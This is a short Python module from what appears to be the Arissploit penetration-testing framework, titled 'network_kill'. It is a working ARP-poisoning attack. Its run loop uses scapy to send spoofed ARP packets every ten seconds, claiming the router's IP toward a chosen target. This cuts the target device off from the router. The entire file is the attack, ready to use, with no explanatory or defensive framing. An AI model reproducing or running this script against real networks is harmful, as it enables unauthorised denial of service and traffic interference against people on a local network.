from core.arissploit import *
import os
import signal
from time import sleep
import logging
from scapy.all import *
from core import colors

conf = {
	"name": "network_kill",
	"version": "1.0",
	"shortdesc": "Blocks communication between router and target.",
	"author": "Entynetproject",
	"initdate": "24.2.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1
}

# List of variables
variables = OrderedDict((
	('target', ['192.168.1.2', "Target device ip."]),
	('router', ['192.168.1.1', "Router's ip."]),
))

# Additional help notes
help_notes = colors.red+"This module will not work without root permission!\n this doesn't work if target refuses from arp request!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("Arp poisoning has been started...")
	printInfo("Ctrl + C to end.")
	packet = ARP()
	packet.psrc = variables['router'][0]
	packet.pdst = variables['target'][0]
	while 1:
		send(packet, verbose=False)
		sleep(10)
